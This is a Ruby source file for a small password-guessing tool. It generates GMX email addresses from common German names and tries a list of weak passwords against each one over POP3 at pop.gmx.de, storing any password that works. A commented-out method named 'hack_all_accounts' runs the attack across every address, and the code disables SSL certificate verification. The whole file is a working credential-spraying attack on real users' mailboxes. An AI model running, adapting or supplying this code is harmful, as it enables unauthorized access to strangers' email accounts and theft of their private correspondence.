class MailAccount #< ActiveRecord::Base
  #belongs_to :email_provider
  attr_accessor :email, :possible_passwords, :false_passwords, :correct_password
  require 'net/pop'
  @@list = []

  def initialize(email)
    @email = email
    @possible_passwords = ['iloveyou', 'fies', 'mutter', 'hund', 'beNrofNuiSlV','hund1']
    @false_passwords = []
    @correct_password = ""
    @@list.push self
  end

  def self.list
    @@list
  end

  def self.create_email_aliases
    email_aliases = []
    email_addresses = []
    prenames = ['stefan', 'ingo', 'ulrike']
    last_names = ['mayer', 'mueller', 'schmidt',]
    prenames.each do |prename|
      last_names.each do |last_name|
        email_aliases.push prename + '.' + last_name
        email_aliases.push prename + last_name
      end
    end
    email_aliases.each do |alias1|
      email_addresses.push alias1 + '@gmx.de'
      email_addresses.push alias1 + '@gmx.net'
    end

    email_addresses
  end

  def self.create_email_accounts
    addresses = self.create_email_aliases
    addresses.each do |address|
      MailAccount.new(address)
    end
    "#{MailAccount.list.count} mail accounts created."
  end

  # def self.hack_all_accounts
  #     @@list.each do |mail_account|
  #       mail_account.possible_passwords do |pw|
  #         mail_account.try_password(pw)
  #        end
  #     end
  #     "Hacking finished"
  # end


  def enable_ssl
    Net::POP3.enable_ssl(OpenSSL::SSL::VERIFY_NONE)
  end

  def try_password(password)
    begin
      Net::POP3.auth_only('pop.gmx.de', 110,
                        self.email, password)
      @correct_password = password
      @possible_passwords -= [password]
      return "SUCCESS: Password is correct"
    rescue Exception => e
      @possible_passwords -= [password]
      return e.to_s + password
    end
  end
end